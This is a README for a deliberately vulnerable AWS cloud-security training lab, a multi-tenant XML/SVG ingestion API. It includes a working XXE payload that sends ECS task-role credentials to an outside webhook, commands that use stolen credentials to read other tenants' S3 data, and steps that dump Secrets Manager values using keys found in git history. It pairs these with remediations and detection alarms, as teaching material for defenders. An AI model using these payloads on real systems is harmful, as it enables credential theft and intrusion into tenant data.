# Cloud Security Lab — Multi-Tenant Data Ingestion API

> **⚠️ WARNING: INTENTIONALLY VULNERABLE APPLICATION**
> This application contains deliberate security vulnerabilities for
> cybersecurity education purposes **only**. Do **not** deploy it to any
> internet-facing or production environment.

---

## Overview

A cloud-native multi-tenant platform where clients (tenants) submit XML and SVG
files through a REST API. The platform authenticates requests, parses uploaded
files to extract metadata, stores raw files in S3, and saves metadata to
PostgreSQL. Every component contains intentional misconfigurations that expose
realistic cloud attack surfaces.

```
Internet ──► ALB (port 80) ──► ECS Fargate (Flask, port 8080)
                                      │
                     ┌────────────────┼────────────────┐
                     ▼                ▼                 ▼
              S3 Bucket          PostgreSQL        Secrets Manager
         (tenant-a/b/c/)         (tenantdb)     (tenant API keys,
                                                  RDS credentials)
```

---

## Intentional Vulnerabilities

| ID | Component | Type | Path |
|----|-----------|------|------|
| VULN-1 | XML/SVG parser | XXE → SSRF → credential theft | Path 1 |
| VULN-2 | S3 API Task Role | Over-permissioned (`s3:*`) / no cross-tenant isolation | Path 1 |
| VULN-3 | API key cache | Unbounded in-memory cache (no TTL) | Path 1 |
| VULN-4 | Upload endpoint | No rate limiting | Path 1 |
| VULN-5 | Error handling | Full stack traces in HTTP responses | Both |
| VULN-6 | S3 versioning | Disabled — allows undetected data tampering | Path 1 |
| VULN-PATH2-A | GitHub Actions | Static IAM credentials hardcoded in pipeline YAML | Path 2 |
| VULN-PATH2-B | Deploy Role | Trust policy has no MFA / IP conditions | Path 2 |

---

## Prerequisites

- Docker ≥ 24 and Docker Compose ≥ 2.24
- `curl`, `jq`
- (Optional) AWS CLI for real-AWS exercises

---

## Quick Start (Local — Docker Compose + LocalStack)

```bash
# 1. Clone / copy the project
git clone <repo-url> sec-lab && cd sec-lab

# 2. Start the full stack
docker compose up --build

# Wait for this line:
#   sec-lab-api  | [INFO] Booting worker with pid: ...

# 3. Verify health
curl http://localhost:8080/health
# → {"service":"sec-lab-api","status":"ok"}

# 4. Load lab helper functions
source scripts/lab_helpers.sh
```

---

## API Reference

All endpoints require `X-API-Key` header (values for local dev below).

| Tenant | API Key |
|--------|---------|
| tenant-a | `lab-key-tenant-a` |
| tenant-b | `lab-key-tenant-b` |
| tenant-c | `lab-key-tenant-c` |

### `GET /health`
ALB health check. No authentication required.

### `POST /upload`
Upload an XML or SVG file for parsing and storage.
```bash
curl -X POST http://localhost:8080/upload \
  -H "X-API-Key: lab-key-tenant-a" \
  -F "file=@mydata.xml"
```

### `GET /uploads`
List all uploads for the authenticated tenant.
```bash
curl http://localhost:8080/uploads \
  -H "X-API-Key: lab-key-tenant-a"
```

### `GET /files/<s3_key>`
Download a specific file. **[VULN-2]** No cross-tenant ownership check.

### `GET /admin/all-objects`
List every object in the bucket across all tenants. **[VULN-2]** Any valid key allowed.

### `GET /lab/secrets-dump`
Read all Secrets Manager values. **Deploy Role over-permission demo.**

---

## Lab Exercises

### Path 1 — XXE → SSRF → Credential Theft

**Objective:** Steal the ECS task's AWS credentials via a malicious XML upload,
then use them to access cross-tenant S3 data.

#### Step 1 — Set up an OOB listener
Open a free webhook at https://webhook.site and copy your unique URL.

#### Step 2 — Upload the XXE payload
```bash
source scripts/lab_helpers.sh
upload_xxe_payload tenant-a lab-key-tenant-a https://webhook.site/YOUR-UUID
```
Or manually:
```bash
curl -X POST http://localhost:8080/upload \
  -H "X-API-Key: lab-key-tenant-a" \
  -F "file=@- ;type=application/xml" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % creds SYSTEM "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}">
  %creds;
  <!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/YOUR-UUID/?d=%creds;'>">
  %oob;
  %exfil;
]>
<data><record>trigger</record></data>
EOF
```

> **Note:** In the Docker Compose setup, `169.254.170.2` is not reachable
> (no Fargate IMDS). In real ECS the container would receive the task role
> credential JSON. The parser still demonstrates the XXE behaviour — you can
> point the entity at `http://localstack:4566/` to confirm network-level SSRF.

#### Step 3 — Cross-tenant enumeration with stolen creds
In a real ECS environment, use the stolen credentials:
```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# The API Task Role has s3:* — list ALL tenants
aws s3 ls s3://sec-lab-data-prod-<suffix>/ --region eu-west-3

# Read another tenant's file
aws s3 cp s3://sec-lab-data-prod-<suffix>/tenant-b/report_q1.xml - --region eu-west-3
```

#### Remediation
1. Replace `lxml` with `defusedxml` in `app.py` (`import defusedxml.ElementTree as ET`)
2. Restrict ECS egress SG to TCP 443 only (removes OOB exfiltration path)
3. Scope API Task Role to `s3:GetObject`/`s3:PutObject` on the requesting
   tenant's prefix only

---

### Path 2 — Hardcoded CI/CD Credentials → Deploy Role → Secrets Exfiltration

**Objective:** Find credentials in git history, assume the Deploy Role
cross-account, then read all secrets and deploy a backdoored container.

#### Step 1 — Find credentials in git history
```bash
git log --all --full-history -- .github/workflows/deploy.yml
git show HEAD:.github/workflows/deploy.yml | grep -E "ACCESS_KEY|SECRET"
# → AWS_ACCESS_KEY_ID:     AKIAIOSFODNN7EXAMPLE
# → AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

#### Step 2 — Assume the Deploy Role (no MFA required)
```bash
source scripts/lab_helpers.sh
simulate_path2_assume_role \
  AKIAIOSFODNN7EXAMPLE \
  wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY \
  arn:aws:iam::111122223333:role/sec-lab-deploy-role-prod
```

#### Step 3 — Read all secrets (Deploy Role has `secretsmanager:GetSecretValue` on `*`)
```bash
export AWS_ACCESS_KEY_ID=<from-step-2>
export AWS_SECRET_ACCESS_KEY=<from-step-2>
export AWS_SESSION_TOKEN=<from-step-2>

aws secretsmanager list-secrets --region eu-west-3
aws secretsmanager get-secret-value --secret-id tenant-a/api-key --region eu-west-3
aws secretsmanager get-secret-value --secret-id rds/credentials --region eu-west-3
```

#### Remediation
1. Delete the IAM user `sec-lab-pipeline-user-dev`
2. Configure GitHub OIDC federation in AWS IAM
3. Update Deploy Role trust policy to accept OIDC subject claim
4. Remove `secretsmanager:GetSecretValue` from Deploy Role (deployment doesn't need it)
5. Add MFA / IP conditions to Deploy Role trust policy

---

## Detection — CloudTrail Alarms

The security account has three CloudWatch metric filter alarms:

| Alarm | Filter pattern | Triggered by |
|-------|---------------|--------------|
| Unexpected Deploy Role assumption | `AssumeRole` on `sec-lab-deploy-role-prod` | Path 2, Step 2 |
| API Task Role direct S3 access | `s3:GetObject` by `sec-lab-task-role-prod` | Path 1, Step 3 |
| Deploy Role bulk Secrets Manager reads | `GetSecretValue` by `sec-lab-deploy-role-prod` | Path 2, Step 3 |

These alarms live in the **security account** — the attacker cannot disable
them even with Deploy Role credentials.

---

## Project Structure

```
.
├── app.py                          # Flask application [VULN-1,2,3,4,5,6]
├── requirements.txt
├── Dockerfile
├── docker-compose.yml              # Local dev stack (LocalStack + PostgreSQL)
├── .env.example                    # Environment variable documentation
├── db/
│   └── init.sql                    # PostgreSQL schema + seed data
├── scripts/
│   └── lab_helpers.sh              # curl helpers & attack payload generators
└── .github/
    └── workflows/
        └── deploy.yml              # [VULN-PATH2-A,B] Hardcoded credentials
```

---

## ECS Deployment (Real AWS)

```bash
# 1. Build and push to ECR
aws ecr get-login-password --region eu-west-3 | \
  docker login --username AWS --password-stdin <account-id>.dkr.ecr.eu-west-3.amazonaws.com

docker build -t sec-lab-api .
docker tag sec-lab-api:latest <account-id>.dkr.ecr.eu-west-3.amazonaws.com/sec-lab-api:latest
docker push <account-id>.dkr.ecr.eu-west-3.amazonaws.com/sec-lab-api:latest

# 2. Update ECS service (picks up new task definition revision)
aws ecs update-service \
  --cluster sec-lab-cluster-prod \
  --service sec-lab-service-prod \
  --force-new-deployment \
  --region eu-west-3

# 3. Get ALB DNS name
aws elbv2 describe-load-balancers \
  --names sec-lab-alb-prod \
  --region eu-west-3 \
  --query 'LoadBalancers[0].DNSName' \
  --output text
```

---

## Vulnerability Summary Reference

```
[VULN-1]  app.py _parse_xml_metadata()
          lxml XMLParser(resolve_entities=True, no_network=False, load_dtd=True)
          Fix: defusedxml.ElementTree.fromstring()

[VULN-2]  app.py _s3_list_objects(), download_file(), admin_all_objects()
          No tenant ownership check on read/list paths
          Fix: enforce s3_key.startswith(g.tenant_id + "/") before every S3 op

[VULN-3]  app.py _api_key_cache dict
          Unbounded dict, no TTL, survives process lifetime
          Fix: use cachetools.TTLCache with 60s expiry

[VULN-4]  app.py /upload endpoint
          No Flask-Limiter or similar rate limiting
          Fix: flask-limiter with Redis backend

[VULN-5]  app.py error handlers
          traceback.format_exc() returned in HTTP response body
          Fix: log internally, return generic error ID to caller

[VULN-6]  S3 bucket versioning disabled (Terraform parameter)
          Allows overwrite without recovery
          Fix: enable bucket versioning (Status=Enabled in Terraform)

[VULN-PATH2-A]  .github/workflows/deploy.yml
                Hardcoded AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY
                Fix: GitHub OIDC + aws-actions/configure-aws-credentials role-to-assume

[VULN-PATH2-B]  Deploy Role trust policy (Terraform)
                No aws:MultiFactorAuthPresent or aws:SourceIp condition
                Fix: add Condition: {Bool: {aws:MultiFactorAuthPresent: "true"}}
                     (or OIDC makes this moot)
```
